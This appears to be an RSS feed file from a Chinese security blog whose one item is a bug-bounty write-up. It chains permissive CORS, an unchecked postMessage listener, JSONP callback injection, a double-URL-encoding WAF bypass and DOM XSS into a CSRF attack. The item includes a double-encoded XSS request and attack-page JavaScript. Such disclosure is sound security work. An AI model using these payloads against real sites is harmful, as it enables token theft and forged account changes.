@@ -1,0 +1,113 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Web安全 on 办公AI智能小助手</title>
+        <link>http://localhost:1313/tags/web%E5%AE%89%E5%85%A8/</link>
+        <description>Recent content in Web安全 on 办公AI智能小助手</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>qife</copyright>
+        <lastBuildDate>Fri, 01 Aug 2025 20:51:05 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/web%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>漏洞链大杂烩：postMessage、JSONP、WAF绕过、DOM型XSS、CORS与CSRF的完美风暴</title>
+        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</link>
+        <pubDate>Fri, 01 Aug 2025 20:51:05 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/</guid>
+        <description>&lt;h1 id=&#34;tldr&#34;&gt;TL;DR
+&lt;/h1&gt;&lt;p&gt;数月前在某公开漏洞赏金项目中，作者发现了一个精妙的漏洞链，包含：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不安全的message事件监听&lt;/li&gt;
+&lt;li&gt;粗糙的JSONP端点&lt;/li&gt;
+&lt;li&gt;WAF绕过技巧&lt;/li&gt;
+&lt;li&gt;范围外子域的DOM型XSS&lt;/li&gt;
+&lt;li&gt;过度宽松的CORS配置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这些漏洞最终组合实现了对范围内资产的CSRF攻击。本文将深度剖析这个攻击链的技术细节。&lt;/p&gt;
+&lt;h1 id=&#34;寻找棘手的csrf漏洞&#34;&gt;寻找棘手的CSRF漏洞
+&lt;/h1&gt;&lt;p&gt;目标赏金项目的范围仅限于&lt;code&gt;www.redacted.com&lt;/code&gt;及其少数子域。当常规测试思路枯竭时，作者注意到&lt;code&gt;inscope.redacted.com&lt;/code&gt;等子域会向&lt;code&gt;https://www.redacted.com/api&lt;/code&gt;发送包含敏感操作（如更新用户资料）的POST请求。这些请求依赖标记为&lt;code&gt;SameSite=None&lt;/code&gt;和&lt;code&gt;Secure&lt;/code&gt;的&lt;code&gt;sid&lt;/code&gt;cookie进行认证，但作为CSRF防护，端点要求查询参数中包含与会话绑定的&lt;code&gt;csrftoken&lt;/code&gt;。&lt;/p&gt;
+&lt;h1 id=&#34;宽松的cors策略突破范围限制&#34;&gt;宽松的CORS策略突破范围限制
+&lt;/h1&gt;&lt;p&gt;测试发现&lt;code&gt;https://www.redacted.com/profile&lt;/code&gt;端点的CORS配置不仅允许&lt;code&gt;https://in-scope.redacted.com&lt;/code&gt;，还接受任意&lt;code&gt;redacted.com&lt;/code&gt;子域的请求：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl -sD - -o /dev/null &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Origin: https://whatever.redacted.com&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie: sid=xxx-yyy-zzz&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  https://www.redacted.com/profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Origin: https://whatever.redacted.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;范围外子域的不安全消息监听&#34;&gt;范围外子域的不安全消息监听
+&lt;/h1&gt;&lt;p&gt;使用postMessage-tracker插件发现&lt;code&gt;https://out-of-scope.redacted.com/search&lt;/code&gt;存在未做来源检查的message事件监听器，其处理逻辑会：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;解析事件数据为JSON对象&lt;/li&gt;
+&lt;li&gt;按点号分割method属性&lt;/li&gt;
+&lt;li&gt;递归访问window.APP对象的嵌套属性&lt;/li&gt;
+&lt;li&gt;调用最终获得的函数并传入arg参数&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;粗糙的jsonp端点导致dom型xss&#34;&gt;粗糙的JSONP端点导致DOM型XSS
+&lt;/h1&gt;&lt;p&gt;&lt;code&gt;window.APP.apiCall&lt;/code&gt;函数用于向&lt;code&gt;https://search.redacted.com&lt;/code&gt;的JSONP端点发送请求，但存在两个关键问题：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;URL构造不安全&lt;/li&gt;
+&lt;li&gt;回调参数验证存在缺陷&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;通过双重URL编码可绕过Akamai WAF防护：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;https://search.redacted.com/&amp;amp;callback=alert%2528%2527xss%2527%2529%252F%252F&amp;amp;output=jsonp&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;组合利用实现一键csrf&#34;&gt;组合利用实现一键CSRF
+&lt;/h1&gt;&lt;p&gt;最终攻击流程：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;诱导用户点击恶意页面按钮&lt;/li&gt;
+&lt;li&gt;弹出窗口打开目标页面&lt;/li&gt;
+&lt;li&gt;通过postMessage触发JSONP请求&lt;/li&gt;
+&lt;li&gt;利用XSS窃取CSRF令牌&lt;/li&gt;
+&lt;li&gt;伪造用户资料更新请求&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;攻击页面核心代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendMsg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;doubleEncodedPayload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;//`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s1&#34;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;APP.apiCall&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s1&#34;&gt;&amp;#39;arg&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;amp;callback=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;doubleEncodedPayload&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;&amp;amp;output=jsonp#`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;postMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JSON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stringify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;origin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;后续&#34;&gt;后续
+&lt;/h1&gt;&lt;p&gt;虽然漏洞链技术复杂度高（CVSS 7.1 High），但最终仅获得200欧元奖励。这反映出某些赏金项目对复杂攻击链的价值评估可能存在偏差。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
